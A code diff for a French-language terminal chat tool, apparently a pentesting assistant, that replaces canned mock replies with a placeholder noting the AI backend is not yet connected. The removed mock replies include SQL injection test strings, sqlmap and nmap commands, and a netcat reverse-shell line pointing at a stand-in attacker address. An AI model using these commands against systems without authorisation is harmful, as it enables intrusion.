@@ -41,7 +41,7 @@ impl ChatState {
         Self {
             messages: vec![ChatMessage {
                 role: MessageRole::Assistant,
-                content: "👋 Salut! Je suis Petoncle, ton assistant pentesting.\n\nPose-moi une question ou demande de l'aide avec une commande.\n\n💡 Astuce: Les commandes suggérées seront numérotées - appuie sur 1-9 pour les envoyer au terminal!".to_string(),
+                content: "👋 Bienvenue dans Petoncle!\n\nInterface chat opérationnelle.\nLe backend IA sera connecté dans une prochaine version.\n\n💡 Tu peux tester l'interface en tapant des messages.".to_string(),
                 timestamp: Local::now(),
             }],
             input: String::new(),
@@ -84,62 +84,14 @@ impl ChatState {
         self.cursor_position = 0;
     }
 
-    /// Generate a mock AI response for testing
-    pub fn generate_mock_response(&self, user_input: &str) -> String {
-        let lower = user_input.to_lowercase();
-
-        if lower.contains("nmap") {
-            "🔍 Pour un scan basique avec nmap:\n\n\
-             nmap -sV -sC <target>\n\n\
-             -sV: Détection de version\n\
-             -sC: Scripts par défaut\n\n\
-             Pour un scan complet:\n\
-             nmap -p- -T4 -A <target>".to_string()
-        } else if lower.contains("help") || lower.contains("aide") {
-            "💡 Je peux t'aider avec:\n\
-             • Syntaxe de commandes (nmap, netcat, etc.)\n\
-             • Recherche de CVEs\n\
-             • Génération de rapports\n\
-             • Conseils de pentesting\n\n\
-             Pose-moi une question spécifique!".to_string()
-        } else if lower.contains("sql") || lower.contains("injection") {
-            "🛡️ SQLi Testing:\n\n\
-             Pour tester manuellement:\n\
-             ' OR '1'='1\n\
-             ' UNION SELECT NULL--\n\n\
-             Avec sqlmap:\n\
-             sqlmap -u <url> --dbs\n\
-             sqlmap -u <url> -D <db> --tables\n\n\
-             ⚠️ Toujours avoir l'autorisation!".to_string()
-        } else if lower.contains("port") || lower.contains("scan") {
-            "🔎 Scan de ports recommandé:\n\n\
-             Scan rapide:\n\
-             nmap -F <target>\n\n\
-             Scan complet:\n\
-             nmap -p- -T4 <target>\n\n\
-             Avec détection de services:\n\
-             nmap -sV -sC -p- <target>".to_string()
-        } else if lower.contains("netcat") || lower.contains("nc") {
-            "🔌 Netcat - Le couteau suisse réseau:\n\n\
-             Écouter sur un port:\n\
-             nc -lvnp 4444\n\n\
-             Se connecter:\n\
-             nc <target> <port>\n\n\
-             Reverse shell:\n\
-             nc -e /bin/bash <attacker_ip> 4444".to_string()
-        } else {
-            format!(
-                "🤔 Je comprends que tu me parles de '{}'.\n\n\
-                 Pour l'instant, je suis en mode démo avec des réponses mockées.\n\n\
-                 Essaie de me demander:\n\
-                 • 'Comment utiliser nmap?'\n\
-                 • 'SQL injection'\n\
-                 • 'Scan de ports'\n\
-                 • 'Netcat'\n\
-                 • 'Aide'",
-                user_input
-            )
-        }
+    /// Placeholder response until AI backend is connected
+    pub fn generate_placeholder_response(&self, _user_input: &str) -> String {
+        "🤖 Backend IA non connecté.\n\n\
+         L'interface chat est fonctionnelle mais le service d'agents Python n'est pas encore implémenté.\n\n\
+         Prochaines étapes:\n\
+         • gRPC communication Rust ↔ Python\n\
+         • Agent service avec LangGraph\n\
+         • RAG avec ChromaDB".to_string()
     }
 }
 
@@ -381,8 +333,8 @@ pub fn run_chat_loop(
                             state.add_user_message(user_message.clone());
                             state.clear_input();
 
-                            // Generate mock response
-                            let response = state.generate_mock_response(&user_message);
+                            // Generate placeholder response (AI not connected yet)
+                            let response = state.generate_placeholder_response(&user_message);
                             state.add_assistant_message(response);
                         }
                     }
